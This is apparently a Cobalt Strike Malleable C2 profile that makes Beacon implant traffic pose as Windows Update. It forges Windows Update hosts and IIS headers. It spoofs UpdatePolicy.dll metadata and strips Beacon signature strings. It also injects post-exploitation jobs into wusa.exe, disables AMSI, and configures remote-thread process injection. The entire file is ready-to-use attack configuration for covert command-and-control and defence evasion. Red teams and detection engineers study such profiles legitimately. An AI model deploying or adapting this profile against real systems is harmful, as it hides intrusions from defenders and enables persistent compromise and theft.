# Windows Updates Malleable C2 Profile
# Version: Cobalt Strike v4.1
# File: windows-updates.profile
# Author: @mohammadaskar2
# Inspired from : https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/microsoftupdate_getonly.profile


# Sleep and jitter
set sleeptime "60000";
set jitter    "20";


# User agent
set useragent "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40";

# HTTPS certficate details

https-certificate {
set keystore "";
set password "";
}

# Stage Options

stage {
    set userwx         "false";
    set stomppe        "true";
    set obfuscate      "true";
    set name           "UpdatePolicy.dll";
    set cleanup        "true";
    set sleep_mask     "true";

    # Values extracted using peclone agaist a Windows 10 version (build 19041.264) of UpdatePolicy.dll
    set checksum       "0";
  	set compile_time   "26 Oct 2080 00:55:44";
  	set entry_point    "135744";
  	set name           "UpdatePolicy.dll";
  	set rich_header    "\x26\x04\x91\x1a\x62\x65\xff\x49\x62\x65\xff\x49\x62\x65\xff\x49\x6b\x1d\x6c\x49\x17\x65\xff\x49\x76\x0e\xfc\x48\x66\x65\xff\x49\x76\x0e\xfb\x48\x6e\x65\xff\x49\x62\x65\xfe\x49\x4d\x60\xff\x49\x76\x0e\xfe\x48\x64\x65\xff\x49\x76\x0e\xff\x48\x63\x65\xff\x49\x76\x0e\xf6\x48\x27\x65\xff\x49\x76\x0e\xfa\x48\x7f\x65\xff\x49\x76\x0e\x02\x49\x63\x65\xff\x49\x76\x0e\x00\x49\x63\x65\xff\x49\x76\x0e\xfd\x48\x63\x65\xff\x49\x52\x69\x63\x68\x62\x65\xff\x49\x00\x00\x00\x00\x00\x00\x00\x00";

    transform-x86 {

        # Add some nops at the beginning of the DLL
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90";


        # Replace some strings in the DLL
        strrep "ReflectiveLoader" "execute";
        strrep "This program cannot be run in DOS mode" "";
        strrep "beacon.dll" "";
    }

    transform-x64 {

        # Add some nops at the beginning of the DLL
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90";

        # Replace some strings in the DLL
        strrep "ReflectiveLoader" "execute";
        strrep "beacon.x64.dll" "";
        strrep "This program cannot be run in DOS mode" "";
    }

    # Add some strings to the DLL
    stringw "GetUpdatePolicyName";
    stringw "GetSkuUpdateManagementGroup";
    stringw "GetAutoUpdatePolicy";
}

# Post Exploitation Options
post-ex {
    # Use wusa.exe (Windows Update Standalone Installer) to inject the post exploitation job into
    set spawnto_x86 "%windir%\\syswow64\\wusa.exe";

    # Use wusa.exe (Windows Update Standalone Installer) to inject the post exploitation job into
    set spawnto_x64 "%windir%\\sysnative\\wusa.exe";

    # Change the permissions and content of our post-ex DLLs
    set obfuscate "true";

    # Pass key function pointers from Beacon to its child jobs
    set smartinject "true";

    # Disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";

}

# SMB Beacon

set pipename         "windows.update.manager##";
set pipename_stager  "windows.update.manager###";


# Process Injection

process-inject {

    set allocator "NtMapViewOfSection";

    set min_alloc "18500";

    set startrwx "false";
    set userwx   "false";

    transform-x86 {
      prepend "\x90\x90\x90\x90";
      append "\x90\x90\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90";
        append "\x90\x90\x90\x90";
    }

    execute {

        CreateThread "ntdll!RtlUserThreadStart+0x42";

        CreateThread;

        NtQueueApcThread-s;

        CreateRemoteThread;

        RtlCreateUserThread;
    }
}


http-get {

    set uri "/c/msdownload/update/others/2020/10/29136388_";

    client {

        header "Accept" "*/*";
        header "Host" "download.windowsupdate.com";


        metadata {
            base64;
            prepend "SESSION=";
            header "Cookie";
        }
    }

    server {

        header "Server" "Microsoft-IIS/8.5";
        header "X-Powered-By" "ASP.NET";
        header "Content-Encoding" "application/vnd.ms-cab-compressed";

        output {
            print;
        }
    }
}

http-post {

    set uri "/c/msdownload/update/others/2020/10/28986731_";

    client {

      header "Accept" "*/*";
      header "Host" "download.windowsupdate.com";


        id {
            parameter "update_id";
        }


        output {
            base64;
            print;
        }
    }

    server {

      header "Server" "Microsoft-IIS/8.5";
      header "X-Powered-By" "ASP.NET";
      header "Content-Encoding" "application/vnd.ms-cab-compressed";

        output {
            print;
        }
    }
}
